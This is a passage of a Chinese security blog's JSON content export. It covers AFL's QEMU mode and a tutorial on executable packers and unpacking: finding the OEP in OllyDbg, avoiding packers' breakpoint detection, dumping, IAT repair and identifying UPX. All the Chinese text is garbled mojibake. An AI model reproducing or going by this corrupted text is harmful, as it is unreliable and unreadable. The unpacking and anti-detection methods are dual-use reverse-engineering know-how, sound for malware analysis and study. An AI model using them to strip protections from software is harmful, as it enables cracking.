·ï¼Œé€šè¿‡æŠŠä¸€ä¸ªå·²ç»åˆå§‹åŒ–å¥½çš„è¿›ç¨‹é•œåƒï¼Œç›´æ¥æ‹·è´åˆ°æ–°çš„è¿›ç¨‹ä¸­ã€‚å½“ç„¶ç¬¬ä¸€æ¬¡ç¿»è¯‘ä¸€ä¸ªæ–°çš„basic blockè¿˜æ˜¯æœ‰å¿…è¦çš„å»¶è¿Ÿï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜AFL fork serveråœ¨emulatorå’Œçˆ¶è¿›ç¨‹ä¹‹é—´æä¾›äº†ä¸€ä¸ªé¢‘é“ã€‚è¿™ä¸ªé¢‘é“ç”¨æ¥é€šçŸ¥çˆ¶è¿›ç¨‹æ–°æ·»åŠ çš„blocksçš„åœ°å€ï¼Œä¹‹åå§è¿™äº›blocksæ”¾åˆ°ä¸€ä¸ªç¼“å­˜ä¸­ï¼Œä»¥ä¾¿ç›´æ¥å¤åˆ¶åˆ°å°†æ¥çš„å­è¿›ç¨‹ä¸­ã€‚è¿™æ ·ä¼˜åŒ–ä¹‹åï¼ŒQEMUæ¨¡å¼å¯¹ç›®æ ‡ç¨‹åºé€ æˆ2-5å€çš„å‡é€Ÿï¼Œç›¸æ¯”ä¹‹ä¸‹ï¼ŒPINé€ æˆ100å€ä»¥ä¸Šçš„å‡é€Ÿã€‚ 13ï¼‰afl-analyzeå·¥å…·æ–‡ä»¶æ ¼å¼åˆ†æå™¨æ˜¯æœ€å°åŒ–ç®—æ³•çš„ç®€å•æ‰©å±•å‰é¢è®¨è®ºè¿‡; è¯¥å·¥å…·æ‰§è¡Œä¸€ç³»åˆ—æ­¥è¡Œå­—èŠ‚ç¿»è½¬ï¼Œç„¶ååœ¨è¾“å…¥æ–‡ä»¶ä¸­æ³¨é‡Šå­—èŠ‚è¿è¡Œï¼Œè€Œä¸æ˜¯å°è¯•åˆ é™¤æ— æ“ä½œå—ã€‚","categories":[{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://cool-y.github.io/categories/äºŒè¿›åˆ¶/"}],"tags":[{"name":"AFL","slug":"AFL","permalink":"https://cool-y.github.io/tags/AFL/"},{"name":"æ¨¡ç³Šæµ‹è¯•","slug":"æ¨¡ç³Šæµ‹è¯•","permalink":"https://cool-y.github.io/tags/æ¨¡ç³Šæµ‹è¯•/"}]},{"title":"åŠ å£³ä¸è„±å£³","slug":"pack-and-unpack","date":"2019-05-14T03:20:59.000Z","updated":"2021-04-10T13:45:39.726Z","comments":true,"path":"2019/05/14/pack-and-unpack/","link":"","permalink":"https://cool-y.github.io/2019/05/14/pack-and-unpack/","excerpt":"","text":"å£³é™„åŠ åœ¨åŸå§‹ç¨‹åºä¸Šï¼Œé€šè¿‡WindowsåŠ è½½å™¨è½½å…¥å†…å­˜åï¼Œå…ˆäºåŸå§‹ç¨‹åºæ‰§è¡Œï¼Œä»¥å¾—åˆ°æ§åˆ¶æƒï¼Œåœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å¯¹åŸå§‹ç¨‹åºè¿›è¡Œè§£å¯†è¿˜åŸï¼Œç„¶åæŠŠæ§åˆ¶æƒè¿˜ç»™åŸå§‹ç¨‹åºï¼Œæ‰§è¡ŒåŸæ¥çš„ä»£ç ã€‚åŠ ä¸Šå¤–å£³åï¼ŒåŸå§‹ç¨‹åºåœ¨ç£ç›˜æ–‡ä»¶ä¸­ä¸€èˆ¬æ˜¯ä»¥åŠ å¯†åçš„å½¢å¼å­˜åœ¨çš„ï¼Œåªåœ¨æ‰§è¡Œæ—¶åœ¨å†…å­˜ä¸­è¿˜åŸã€‚è¿™æ ·å¯ä»¥æœ‰æ•ˆé˜²æ­¢ç ´è§£è€…å¯¹ç¨‹åºæ–‡ä»¶è¿›è¡Œéæ³•ä¿®æ”¹ï¼Œä¹Ÿå¯ä»¥é˜²æ­¢ç¨‹åºè¢«é™æ€åç¼–è¯‘ã€‚ å£³çš„åŠ è½½è¿‡ç¨‹å£³å’Œç—…æ¯’åœ¨æŸäº›åœ°æ–¹ç±»ä¼¼ï¼Œéƒ½éœ€è¦è·å¾—æ¯”åŸç¨‹åºæ›´æ—©çš„æ§åˆ¶æƒã€‚å£³ä¿®æ”¹äº†åŸç¨‹åºæ‰§è¡Œæ–‡ä»¶çš„ç»„ç»‡ç»“æ„ï¼Œä»è€Œè·å¾—æ§åˆ¶æƒï¼Œä½†ä¸ä¼šå½±å“åŸç¨‹åºæ­£å¸¸è¿è¡Œã€‚ ä¿å­˜å…¥å£å‚æ•°åŠ å£³ç¨‹åºåœ¨åˆå§‹åŒ–æ—¶ä¼šä¿å­˜å„å¯„å­˜å™¨çš„å€¼ï¼Œå¾…å¤–å£³æ‰§è¡Œå®Œæ¯•ï¼Œå†æ¢å¤å„å¯„å­˜å™¨çš„å†…å®¹ï¼Œæœ€åè·³å›åŸç¨‹åºæ‰§è¡Œã€‚é€šå¸¸ç”¨pushad/popadç­‰æŒ‡ä»¤ä¿å­˜å’Œæ¢å¤ç°åœºç¯å¢ƒã€‚ è·å–å£³æœ¬èº«éœ€è¦ä½¿ç”¨çš„APIåœ°å€ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¤–å£³çš„è¾“å…¥è¡¨ä¸­åªæœ‰GetProcAddressã€GetModuleHandleå’ŒLoadLibraryè¿™ä¸‰ä¸ªAPIå‡½æ•°ï¼Œç”šè‡³åªæœ‰Kernel32.dllåŠGetProcAddressã€‚å¦‚æœéœ€è¦å…¶ä»–APIå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡LoadlibraryAæˆ–LoadlibraryExAå°†DLLæ–‡ä»¶æ˜ åƒæ˜ å°„åˆ°è°ƒç”¨è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ï¼Œå‡½æ•°è¿”å›çš„HINSTANCEå€¼ç”¨äºæ ‡è¯†æ–‡ä»¶æ˜ åƒæ‰€æ˜ å°„çš„è™šæ‹Ÿå†…å­˜åœ°å€ã€‚ è§£å¯†åŸç¨‹åºå„ä¸ªåŒºå—çš„æ•°æ®åœ¨ç¨‹åºæ‰§è¡Œæ—¶ï¼Œå¤–å£³å°†è§£å¯†åŒºå—æ•°æ®ï¼Œä½¿ç¨‹åºæ­£å¸¸è¿è¡Œã€‚ IATçš„åˆå§‹åŒ–IATçš„å¡«å†™æœ¬æ¥ç”±PEè£…è½½å™¨å®ç°ï¼Œä½†ç”±äºåœ¨åŠ å£³æ—¶æ„é€ äº†ä¸€ä¸ªè‡ªå»ºè¾“å…¥è¡¨ï¼Œå¹¶è®©PEæ–‡ä»¶å¤´æ•°æ®ç›®å½•è¡¨ä¸­çš„è¾“å…¥è¡¨æŒ‡é’ˆæŒ‡å‘è‡ªå»ºè¾“å…¥è¡¨ï¼ŒPEè£…è½½å™¨è½¬è€Œå¡«å†™è‡ªå»ºè¾“å…¥è¡¨ï¼Œç¨‹åºçš„åŸå§‹è¾“å…¥è¡¨è¢«å¤–å£³å˜å½¢åå­˜å‚¨ï¼ŒIATçš„å¡«å†™ä¼šç”±å¤–å£³ç¨‹åºå®ç°ã€‚å¤–å£³ä»å¤´åˆ°å°¾æ‰«æå˜å½¢åçš„è¾“å…¥è¡¨ç»“æ„ï¼Œé‡æ–°è·å¾—å¼•å…¥å‡½æ•°åœ°å€ï¼Œå¡«å†™åœ¨IATä¸­ã€‚ é‡å®šä½é¡¹çš„å¤„ç†é’ˆå¯¹åŠ å£³çš„DLL Hook APIå£³åœ¨ä¿®æ”¹åŸç¨‹åºæ–‡ä»¶çš„è¾“å…¥è¡¨åè‡ªå·±æ¨¡ä»¿æ“ä½œç³»ç»Ÿçš„æµç¨‹ï¼Œå‘è¾“å…¥è¡¨å¡«å……ç›¸å…³æ•°æ®ã€‚åœ¨å¡«å……è¿‡ç¨‹ä¸­ï¼Œå¤–å£³å¯ä»¥å¡«å……Hook APIä»£ç çš„åœ°å€ï¼Œä»è€Œè·å¾—ç¨‹åºæ§åˆ¶æƒã€‚ è·³è½¬åˆ°OEP é€šç”¨è„±å£³æ–¹æ³•é€šå¸¸è„±å£³çš„åŸºæœ¬æ­¥éª¤å¦‚ä¸‹:1:å¯»æ‰¾OEP2:è½¬å‚¨(PS:ä¼ è¯´ä¸­çš„dump)3:ä¿®å¤IAT(ä¿®å¤å¯¼å…¥è¡¨)4:æ£€æŸ¥ç›®æ ‡ç¨‹åºæ˜¯å¦å­˜åœ¨AntiDumpç­‰é˜»æ­¢ç¨‹åºè¢«è½¬å‚¨çš„ä¿æŠ¤æªæ–½,å¹¶å°è¯•ä¿®å¤è¿™äº›é—®é¢˜ã€‚ä»¥ä¸Šæ˜¯è„±å£³çš„ç»å…¸æ­¥éª¤,å¯èƒ½å…·ä½“åˆ°ä¸åŒçš„å£³çš„è¯ä¼šæœ‰ç»†å¾®çš„å·®åˆ«ã€‚ å¯»æ‰¾OEP æœç´¢JMPæˆ–è€…CALLæŒ‡ä»¤çš„æœºå™¨ç (å³ä¸€æ­¥ç›´è¾¾æ³•,åªé€‚ç”¨äºå°‘æ•°å£³,åŒ…æ‹¬UPX,ASPACKå£³)å¯¹äºä¸€äº›ç®€å•çš„å£³å¯ä»¥ç”¨è¿™ç§æ–¹å¼æ¥å®šä½OEP,ä½†æ˜¯å¯¹äºåƒAsProtectè¿™ç±»å¼ºå£³(PS:AsProtectåœ¨04å¹´ç®—æ˜¯å¼ºå£³äº†,å˜¿å˜¿)å°±ä¸é€‚ç”¨äº†,æˆ‘ä»¬å¯ä»¥ç›´æ¥æœç´¢é•¿è·³è½¬JMP(0E9)æˆ–è€…CALL(0E8)è¿™ç±»é•¿è½¬ç§»çš„æœºå™¨ç ,ä¸€èˆ¬æƒ…å†µä¸‹(ç†æƒ³æƒ…å†µ)å£³åœ¨è§£å¯†å®ŒåŸç¨‹åºå„ä¸ªåŒºæ®µä»¥å,éœ€è¦ä¸€ä¸ªé•¿JMPæˆ–è€…CALLè·³è½¬åˆ°åŸç¨‹åºä»£ç æ®µä¸­çš„OEPå¤„å¼€å§‹æ‰§è¡ŒåŸç¨‹åºä»£ç ã€‚æŒ‰CTRL+Bç»„åˆé”®æœç´¢ä¸€ä¸‹JMPçš„æœºå™¨ç E9(CTRL+LæŸ¥çœ‹ä¸‹ä¸€ä¸ªï¼‰,çœ‹çœ‹æœ‰æ²¡æœ‰è¿™æ ·ä¸€ä¸ªJMPè·³è½¬åˆ°åŸç¨‹åºçš„ä»£ç æ®µã€‚ ä½¿ç”¨OllyDbgè‡ªå¸¦çš„åŠŸèƒ½å®šä½OEP(SFXæ³•)æ¼”ç¤ºè¿™ç§æ–¹æ³•ç›®æ ‡ç¨‹åºæˆ‘ä»¬è¿˜æ˜¯é€‰æ‹©CRACKME UPX.EXE,ç”¨ODåŠ è½½è¯¥ç¨‹åº,ç„¶åé€‰æ‹©èœå•é¡¹Options-Debugging options-SFXã€‚è¯¥é€‰é¡¹åªæœ‰å½“OllyDbgå‘ç°å£³çš„å…¥å£ç‚¹ä½äºä»£ç æ®µä¹‹å¤–çš„æ—¶å€™æ‰ä¼šèµ·ä½œç”¨,å£³çš„å…¥å£ç‚¹ä½äºä»£ç æ®µä¸­çš„æƒ…å†µè¿˜æ˜¯æ¯”è¾ƒå°‘è§çš„ã€‚ ä½¿ç”¨Patchè¿‡çš„ODæ¥å®šä½OEP(å³å†…å­˜æ˜ åƒæ³•)æ­£å¸¸çš„å†…å­˜è®¿é—®æ–­ç‚¹è¯»å–,å†™å…¥,æ‰§è¡Œçš„æ—¶å€™éƒ½ä¼šæ–­ä¸‹æ¥,è¯¥Patchè¿‡çš„ODå†…å­˜è®¿é—®æ–­ç‚¹ä»…å½“æ‰§è¡Œçš„æ—¶å€™æ‰ä¼šæ–­ä¸‹æ¥,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥å®šä½OEPã€‚UPXå£³çš„è§£å¯†ä¾‹ç¨‹ä¼šè§£å¯†åŸç¨‹åºçš„å„ä¸ªåŒºæ®µå¹¶å°†å„ä¸ªåŒºæ®µåŸå§‹å­—èŠ‚å†™å›åˆ°åŸå¤„,æˆ‘ä»¬æœ€å¥½ä¸è¦åœ¨è§£å¯†åŒºæ®µçš„è¿‡ç¨‹ä¸­æ–­ä¸‹æ¥,è¯´ä¸å®šè¦æ–­æˆåƒä¸Šä¸‡æ¬¡æ‰èƒ½åˆ°è¾¾OEP,è¿™é‡Œæœ‰äº†è¿™ä¸ªPatchè¿‡çš„ODå°±æ–¹ä¾¿å¤šäº†,å…¶å†…å­˜è®¿é—®æ–­ç‚¹ä»…å½“æ‰§è¡Œçš„æ—¶å€™æ‰ä¼šæ–­ä¸‹æ¥,å½“å…¶åœ¨æ‰§è¡Œç¬¬ä¸€ä¸ªåŒºæ®µä¸­çš„ä»£ç æ—¶,åŸºæœ¬ä¸Šå°±å¯ä»¥æ–­å®šæ˜¯OEPäº†ã€‚ å †æ ˆå¹³è¡¡æ³•(å³ESPå®šå¾‹æ³•)è¿™ç§æ–¹æ³•é€‚ç”¨äºä¸€äº›å¤è€çš„å£³ã€‚è¿™äº›å£³é¦–å…ˆä¼šä½¿ç”¨PUSHADæŒ‡ä»¤ä¿å­˜å¯„å­˜å™¨ç¯å¢ƒ,åœ¨è§£å¯†å„ä¸ªåŒºæ®µå®Œæ¯•,è·³å¾€OEPä¹‹å‰,ä¼šä½¿ç”¨POPADæŒ‡ä»¤æ¢å¤å¯„å­˜å™¨ç¯å¢ƒã€‚æœ‰çš„æƒ…å†µä¸‹ä¿å­˜å¯„å­˜å™¨ç¯å¢ƒå¯èƒ½ä¸æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤,ä½†ä¹Ÿåœ¨é™„è¿‘äº†,è¿˜æœ‰äº›æƒ…å†µä¸‹,æœ‰äº›å£³ä¸ä½¿ç”¨PUSHAD,è€Œæ˜¯é€ä¸€PUSHå„ä¸ªå¯„å­˜å™¨(ä¾‹å¦‚:PUSH EAX,PUSH EBXç­‰ç­‰),æ€»è€Œè¨€ä¹‹,åœ¨è§£å¯†å®ŒåŒºæ®µ,è·³å¾€OEPä¹‹å‰ä¼šæ¢å¤å¯„å­˜å™¨ç¯å¢ƒã€‚æŒ‰F7é”®æ‰§è¡ŒPUSHAD:å¯ä»¥çœ‹åˆ°å„ä¸ªå¯„å­˜å™¨çš„åˆå§‹å€¼è¢«å‹å…¥åˆ°å †æ ˆä¸­äº†,è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¯¹è¿™äº›åˆå§‹å€¼è®¾ç½®å†…å­˜æˆ–è€…ç¡¬ä»¶è®¿é—®æ–­ç‚¹,å½“è§£å¯†ä¾‹ç¨‹è¯»å–è¿™äº›åˆå§‹å€¼çš„æ—¶å€™å°±ä¼šæ–­ä¸‹æ¥,æ–­ä¸‹æ¥å¤„åŸºæœ¬ä¸Šå°±åœ¨OEPé™„è¿‘äº†ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ESPå¯„å­˜å™¨å€¼ä¸Šé¢å•å‡»é¼ æ ‡å³é”®é€‰æ‹©-Follow in dumpåœ¨æ•°æ®çª—å£ä¸­å®šä½åˆ°è¿™äº›å¯„å­˜å™¨çš„åˆå§‹å€¼ã€‚å¯¹è¿™äº›åˆå§‹å€¼çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æˆ–è€…å‰4ä¸ªå­—èŠ‚è®¾ç½®ç¡¬ä»¶è®¿é—®æ–­ç‚¹ã€‚å½“å£³çš„è§£å¯†ä¾‹ç¨‹è¯»å–è¯¥å€¼çš„æ—¶å€™æ–­äº†ä¸‹æ¥ï¼Œåœåœ¨popadçš„ä¸‹ä¸€è¡Œ,ç´§æ¥ç€ä¸‹é¢å°±æ˜¯è·³å¾€OEPå¤„,è¯´æ˜è¿™ä¸ªæ–¹æ³•èµ·ä½œç”¨äº†ã€‚ VBåº”ç”¨ç¨‹åºå®šä½OEPæ³•(Native æˆ–è€… P-CODE)å®šä½VBç¨‹åºçš„OEPæ¯”è¾ƒå®¹æ˜“,å› ä¸ºVBåº”ç”¨ç¨‹åºéƒ½æœ‰ä¸€ä¸ªç‰¹ç‚¹-å¼€å§‹éƒ½æ˜¯ä¸€ä¸ªPUSHæŒ‡ä»¤,ç´§æ¥ç€ä¸€ä¸ªCALLæŒ‡ä»¤è°ƒç”¨ä¸€ä¸ªVB APIå‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Patchè¿‡çš„OD,é¦–å…ˆå®šä½åˆ°VBçš„åŠ¨æ€åº“,æ¥ç€ç»™è¯¥åŠ¨æ€åº“çš„ä»£ç æ®µè®¾ç½®å†…å­˜è®¿é—®æ–­ç‚¹,å½“å£³çš„è§£å¯†ä¾‹ç¨‹è§£å¯†å®ŒåŸç¨‹åºå„ä¸ªåŒºæ®µ,æ¥ç€å°±ä¼šæ–­åœ¨VB DLLçš„ç¬¬ä¸€æ¡æŒ‡ä»¤å¤„,æ¥ç€æˆ‘ä»¬å¯ä»¥åœ¨å †æ ˆä¸­å®šä½åˆ°è¿”å›åœ°å€,å°±å¯ä»¥æ¥åˆ°OEPçš„ä¸‹ä¸€æ¡æŒ‡ä»¤å¤„ã€‚è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨å‰é¢ä»‹ç»çš„æ–¹æ³•-è·Ÿé€ä¸€ç»™å„ä¸ªåŒºæ®µè®¾ç½®å†…å­˜è®¿é—®æ–­ç‚¹(ä½¿ç”¨Patchè¿‡çš„OD),ä½†æ˜¯å¾ˆå¤šå£³ä¼šæ£€æµ‹è¿™ç§æ–¹æ³•,æ‰€ä»¥å¤§å®¶å¯èƒ½æ ¹æ®éœ€è¦ä¸åŒçš„æƒ…å†µæ¥å°è¯•è¿™ä¸åŒçš„æ–¹æ³•ã€‚è¿™ç§æ–¹æ³•å¾ˆå®¹æ˜“ç†è§£,æˆ‘å°±ä¸ä¸¾ä¾‹å­äº†,ä»¥åå¤§å®¶å¦‚æœé‡åˆ°äº†VBç¨‹åºå¯ä»¥è¯•è¯•è¿™ç§æ–¹æ³•ã€‚ æœ€åä¸€æ¬¡å¼‚å¸¸æ³•å¦‚æœæˆ‘ä»¬åœ¨è„±å£³çš„è¿‡ç¨‹ä¸­å‘ç°ç›®æ ‡ç¨‹åºäº§ç”Ÿå¤§é‡å¼‚å¸¸çš„è¯,å°±å¯ä»¥ä½¿ç”¨æœ€åä¸€æ¬¡å¼‚å¸¸æ³•,å°†EXCEPTIONSèœå•é¡¹ä¸­çš„å¿½ç•¥å„ä¸ªå¼‚å¸¸çš„é€‰é¡¹éƒ½å‹¾é€‰ä¸Š,è¿è¡Œèµ·æ¥ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°äº§ç”Ÿäº†å¥½å‡ å¤„å¼‚å¸¸,ä½†æ˜¯éƒ½ä¸æ˜¯ä½äºç¬¬ä¸€ä¸ªåŒºæ®µ,è¯´æ˜è¿™äº›å¼‚å¸¸ä¸æ˜¯åœ¨åŸç¨‹åºè¿è¡ŒæœŸé—´å‘ç”Ÿçš„,æ˜¯åœ¨å£³çš„è§£å¯†ä¾‹ç¨‹æ‰§è¡ŒæœŸé—´äº§ç”Ÿçš„å¼‚å¸¸ã€‚é‡æ–°å¯åŠ¨OD,å°†EXCEPTIONSèœå•é¡¹ä¸­å¿½ç•¥çš„å¼‚å¸¸é€‰é¡¹çš„å¯¹å‹¾éƒ½å»æ‰,ä»…ä¿ç•™Ignore memory access violations in KERNEL32è¿™ä¸ªé€‰é¡¹çš„å¯¹å‹¾ã€‚æŒ‰SHIFT + F9å¿½ç•¥å¼‚å¸¸ç»§ç»­è¿è¡Œ,æˆ‘ä»¬ç›´åˆ°æœ€åä¸€æ¬¡å¼‚å¸¸ã€‚æ¥ç€æˆ‘ä»¬å¯ä»¥ å¯¹ä»£ç æ®µè®¾ç½®å†…å­˜è®¿é—®æ–­ç‚¹ ,å¯èƒ½æœ‰äººä¼šé—®,ä¸ºä»€ä¹ˆä¸åœ¨ä¸€å¼€å§‹è®¾ç½®å†…å­˜è®¿é—®æ–­ç‚¹å‘¢?åŸå› æ˜¯å¾ˆå¤šå£³ä¼šæ£€æµ‹ç¨‹åºåœ¨å¼€å§‹æ—¶æ˜¯å¦è‡ªèº«è¢«è®¾ç½®å†…å­˜è®¿é—®æ–­ç‚¹,å¦‚æœæ‰§è¡Œåˆ°äº†æœ€åä¸€æ¬¡å¼‚å¸¸å¤„çš„è¯,å¾ˆå¯èƒ½å·²ç»ç»•è¿‡äº†å£³çš„æ£€æµ‹æ—¶æœºï¼ ç”¨å£³æœ€å¸¸ç”¨çš„APIå‡½æ•°æ¥å®šä½OEPå°†å¿½ç•¥çš„å¼‚å¸¸é€‰é¡¹éƒ½å‹¾é€‰ä¸Š,æˆ‘ä»¬æ¥å®šä½ä¸€ä¸‹å£³æœ€å¸¸ç”¨çš„APIå‡½æ•°,æ¯”å¦‚GetProcAddress,LoadLibraryã€‚ExitThreadæœ‰äº›å£³ä¼šç”¨ã€‚ä½¿ç”¨bp GetProcAddresså‘½ä»¤ç»™è¯¥APIå‡½æ•°è®¾ç½®ä¸€ä¸ªæ–­ç‚¹ã€‚æˆ‘ä»¬åªéœ€è¦çŸ¥é“å£³åœ¨å“ªäº›åœ°æ–¹è°ƒç”¨GetProcAddress,æ‰€ä»¥æˆ‘ä»¬åœ¨æ–­ä¸‹æ¥çš„è¿™ä¸€è¡Œä¸Šé¢å•å‡»é¼ æ ‡å³é”®é€‰æ‹©-Breakpoint-Conditional log,æ¥è®¾ç½®æ¡ä»¶è®°å½•ã€‚å°†Pause programè¿™ä¸€é¡¹å‹¾é€‰ä¸ŠNever,è®°å½•çš„è¡¨è¾¾å¼è®¾ç½®ä¸º[ESP],ä¹Ÿå°±æ˜¯è®°å½•è¿”å›åœ°å€,è¿™æ ·æˆ‘ä»¬å°±èƒ½çŸ¥é“å“ªäº›åœ°æ–¹è°ƒç”¨GetProcAddressã€‚æ¥ç€åœ¨æ—¥å¿—çª—å£ä¸­å•å‡»é¼ æ ‡å³é”®é€‰æ‹©-Clear Log(æ¸…ç©ºæ—¥å¿—)ã€‚è¿è¡Œèµ·æ¥,æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºçš„ä¸»çª—å£å¼¹äº†å‡ºæ¥,æ‰“å¼€æ—¥å¿—çª—å£,çœ‹çœ‹æœ€åä¸€æ¬¡GetProcAddress(æ’é™¤æ‰ç¬¬ä¸€ä¸ªåŒºæ®µä¸­è°ƒç”¨çš„ä½ç½®)æ˜¯åœ¨å“ªé‡Œè¢«è°ƒç”¨çš„ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ å¯¹ä»£ç æ®µè®¾ç½®å†…å­˜è®¿é—®æ–­ç‚¹ ä¹‹å‰å°è¯•ä¸€ä¸‹è¿™ç§æ–¹æ³•,è¿™æ ·å°±å¯ä»¥ç»•è¿‡å¾ˆå¤šå£³å¯¹å†…å­˜æ–­ç‚¹çš„æ£€æµ‹,ä½†æ˜¯æœ‰ä¸€äº›å£³ä¹Ÿä¼šå¯¹APIå‡½æ•°æ–­ç‚¹è¿›è¡Œæ£€æµ‹,æ‰€ä»¥è¯´æˆ‘ä»¬éœ€è¦å„ç§æ–¹å¼éƒ½å°è¯•ä¸€ä¸‹,æ‰¾åˆ°æœ€åˆé€‚çš„ã€‚ åˆ©ç”¨åº”ç”¨ç¨‹åºè°ƒç”¨çš„ç¬¬ä¸€ä¸ªAPIå‡½æ•°æ¥å®šä½OEP IATè¡¨ä¿®å¤ä¸ºäº†ç¡®ä¿æ“ä½œç³»ç»Ÿå°†æ­£ç¡®çš„APIå‡½æ•°åœ°å€å¡«å……åˆ°IATä¸­,åº”è¯¥æ»¡è¶³ä¸€ä¸‹å‡ ç‚¹è¦æ±‚:1:å¯æ‰§è¡Œæ–‡ä»¶å„IATé¡¹æ‰€åœ¨çš„æ–‡ä»¶åç§»å¤„å¿…é¡»æ˜¯ä¸€ä¸ªæŒ‡é’ˆ,æŒ‡å‘ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚2:è¯¥å­—ç¬¦ä¸²ä¸ºAPIå‡½æ•°çš„åç§°ã€‚å¦‚æœè¿™ä¸¤é¡¹æ»¡è¶³,å°±å¯ä»¥ç¡®ä¿ç¨‹åºåœ¨å¯åŠ¨æ—¶,æ“ä½œç³»ç»Ÿä¼šå°†æ­£ç¡®çš„APIå‡½æ•°åœ°å€å¡«å……åˆ°IATä¸­ã€‚å‡å¦‚,æˆ‘ä»¬å½“å‰ä½äºè¢«åŠ å£³ç¨‹åºçš„OEPå¤„,æˆ‘ä»¬æ¥ä¸‹æ¥å¯ä»¥å°†ç¨‹åºdumpå‡ºæ¥,ä½†æ˜¯åœ¨dumpä¹‹å‰æˆ‘ä»¬å¿…é¡»ä¿®å¤IAT,ä¸ºä»€ä¹ˆè¦ä¿®å¤IATå‘¢?éš¾é“å£³å°†IATç ´åäº†å—?å¯¹,çš„ç¡®æ˜¯è¿™æ ·,å£³å‹æ ¹ä¸éœ€è¦åŸç¨‹åºçš„IAT,å› ä¸ºè¢«åŠ å£³ç¨‹åºé¦–å…ˆä¼šæ‰§è¡Œè§£å¯†ä¾‹ç¨‹,è¯»å–IATä¸­æ‰€éœ€è¦çš„APIçš„åç§°æŒ‡é’ˆ,ç„¶åå®šä½åˆ°APIå‡½æ•°åœ°å€,å°†å…¶å¡«å…¥åˆ°IATä¸­,è¿™ä¸ªæ—¶å€™,IATä¸­å·²ç»è¢«å¡«å……äº†æ­£ç¡®çš„APIå‡½æ•°åœ°å€,å¯¹åº”çš„APIå‡½æ•°åç§°çš„å­—ç¬¦ä¸²å·²ç»ä¸éœ€è¦äº†,å¯ä»¥æ¸…é™¤æ‰ã€‚å¤§éƒ¨åˆ†çš„å£³ä¼šå°†APIå‡½æ•°åç§°å¯¹åº”çš„å­—ç¬¦ä¸²ä»¥å¯†æ–‡çš„å½¢å¼ä¿å­˜åˆ°æŸä¸ªåœ°å€å¤„,è®©Crackerä»¬ä¸èƒ½é‚£ä¹ˆå®¹æ˜“æ‰¾åˆ°å®ƒä»¬ã€‚ å‹ç¼©å£³å‹ç¼©å£³çš„ç‰¹ç‚¹å°±æ˜¯å‡å°è½¯ä»¶çš„ä½“ç§¯ï¼ŒåŠ å¯†ä¿æŠ¤ä¸æ˜¯é‡ç‚¹ã€‚ç›®å‰ï¼Œå…¼å®¹æ€§å’Œç¨³å®šæ€§è¾ƒå¥½çš„å‹ç¼©å£³æœ‰UPXã€ASPackã€PECompactç­‰ã€‚ UPXUPX-the Ultimate Packer for eXecutablesæ˜¯ä»¥å‘½ä»¤è¡Œæ–¹å¼æ“ä½œçš„å¯æ‰§è¡Œæ–‡ä»¶å‹ç¼©ç¨‹åºã€‚UPXæ—©æœŸçš„å‹ç¼©å¼•æ“æ˜¯æœ‰UPXè‡ªå·±å®ç°çš„ï¼Œå…¶3.xç‰ˆæœ¬ä¹Ÿæ”¯æŒLZMAç¬¬ä¸‰æ–¹å‹ç¼©å¼•æ“ã€‚UPXé™¤äº†å¯¹ç›®æ ‡ç¨‹åºè¿›è¡Œå‹ç¼©ï¼Œä¹Ÿå¯ä»¥è§£å‹ç¼©ã€‚å®ƒä¸åŒ…å«ä»»ä½•åè°ƒè¯•æˆ–ä¿æŠ¤ç­–ç•¥ã€‚å¦å¤–ï¼ŒUPXä¿æŠ¤å·¥å…·UPXPRã€UPX-sCRAMBLERç­‰å¯ä¿®æ”¹UPXåŠ å£³æ ‡å¿—ï¼Œä½¿å…¶è‡ªè§£å‹åŠŸèƒ½å¤±æ•ˆã€‚1Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file è¯†åˆ«UPXåŠ å£³è¢«åŠ å£³ç¨‹åºï¼šç‚¹å‡»æŒ‰é’®ä¹‹åå¼¹æ¡† å¯¼å…¥å‡½æ•°å¾ˆå°‘æœªåŠ å£³ç¨‹åºçš„å¯¼å…¥å‡½æ•°ï¼šåŠ å£³åçš„å¯¼å…¥å‡½æ•°ï¼š ä½¿ç”¨IDAè¯†åˆ«ä»£ç æ®µåªæœ‰å°‘é‡çš„ä»£ç è¢«è¯†åˆ« ä½¿ç”¨OllyDbgæ‰“å¼€ç¨‹åºï¼Œè­¦å‘Šè¢«åŠ å£³ ç¨‹åºçš„èŠ‚ååŒ…å«åŠ å£³å™¨çš„æ ‡è¯†åŠ å£³åçš„ç¨‹åºèŠ‚åä¸ºUPX0ã€UPX1ã€rsrc ç¨‹åºæ‹¥æœ‰ä¸æ­£å¸¸çš„èŠ‚å¤§å°ã€‚ä¾‹å¦‚.textèŠ‚çš„åŸå§‹æ•°æ®å¤§å°ä¸º0ï¼Œä½†è™šæ‹Ÿå¤§å°é0 ä½¿ç”¨åŠ å£³æ¢æµ‹å·¥å…·å¦‚PEiD ç†µå€¼è®¡ç®—å‹ç¼©æˆ–åŠ å¯†æ•°æ®æ›´æ¥è¿‘äºéšæœºæ•°æ®ï¼Œç†µå€¼æ›´é«˜ã€‚å¦‚ä½¿ç”¨PEiDè®¡ç®—ç†µå€¼PEiDè®¡ç®—ç†µå€¼çš„æ–¹æ³•ï¼š1.é‡æ–°ç»„ç»‡éœ€è¦è®¡ç®—çš„æ•°æ®iï¼ä»¥ä¸‹æ•°æ®ä¸åˆ—å…¥è®¡ç®—ç†µçš„èŒƒå›´ï¼šå¯¼å‡ºè¡¨æ•°æ®ã€å¯¼å…¥è¡¨æ•°æ®ã€èµ„æºæ•°æ®ã€é‡å®šå‘æ•°æ®ã€‚ii. 